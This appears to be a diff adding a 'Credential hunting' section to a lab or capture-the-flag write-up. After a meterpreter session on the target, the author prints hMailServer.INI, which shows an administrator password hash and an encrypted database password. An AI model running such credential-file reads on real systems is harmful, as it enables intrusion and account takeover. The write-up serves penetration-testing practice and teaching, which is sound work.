@@ -243,3 +243,33 @@ Then ill send the email
 
 And after a second i get a meterpreter session
 
+# Credential hunting
+
+```python
+PS C:\Program Files (x86)\hMailServer\Bin> type hMailServer.INI
+type hMailServer.INI
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=8a53bc0c0c9733319e5ee28dedce038e
+[Database]
+Type=MSSQLCE
+Username=
+Password=4e9989caf04eaa5ef87fd1f853f08b62
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+PS C:\Program Files (x86)\hMailServer\Bin> 
+```
+
+Ill look around the file system, and find what looks like encrypted creds
+
